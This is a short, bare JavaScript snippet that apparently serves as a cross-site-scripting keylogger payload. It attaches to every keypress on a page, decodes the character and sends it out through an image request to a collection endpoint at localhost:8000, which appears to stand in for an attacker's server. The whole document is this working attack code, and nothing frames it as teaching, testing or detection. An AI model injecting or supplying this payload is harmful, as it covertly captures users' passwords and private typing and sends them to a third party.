 
document.onkeypress = function(e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    new Image().src = 'http://localhost:8000/keypress?key=' + key;
}
 
